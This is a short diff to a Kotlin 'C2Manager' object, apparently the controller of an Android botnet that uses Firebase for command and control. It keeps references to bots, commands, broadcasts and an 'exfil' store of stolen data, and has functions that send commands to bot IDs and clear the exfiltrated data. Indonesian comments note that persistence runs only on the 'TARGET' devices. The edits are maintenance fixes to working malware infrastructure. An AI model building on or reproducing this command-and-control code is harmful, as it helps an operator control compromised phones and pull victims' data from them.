@@ -82,7 +82,8 @@ object C2Manager {
         if (::database.isInitialized) return
         try {
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
-            database.setPersistenceEnabled(true)
+            // 🔥 FIX: HAPUS setPersistenceEnabled dari CONTROLLER
+            // Persistence cuma dipake di TARGET biar ga conflict
             botsRef = database.getReference(REF_BOTS)
             commandsRef = database.getReference(REF_COMMANDS)
             exfilRef = database.getReference(REF_EXFIL)
@@ -168,8 +169,6 @@ object C2Manager {
         exfilRef.addValueEventListener(exfilListener!!)
     }
 
-    // ==================== 🔥 FIX: TAMBAH KEY "target" BIAR DIBACA TARGET ====================
-
     fun sendCommand(botId: String, type: String, payload: String = "") {
         val cmdId = commandsRef.push().key ?: return
         val cmd = mapOf(
@@ -195,8 +194,6 @@ object C2Manager {
         )
         broadcastRef.child(cmdId).setValue(cmd)
     }
-
-    // ======================================================================================
 
     fun clearExfiltratedData() {
         exfilRef.removeValue()
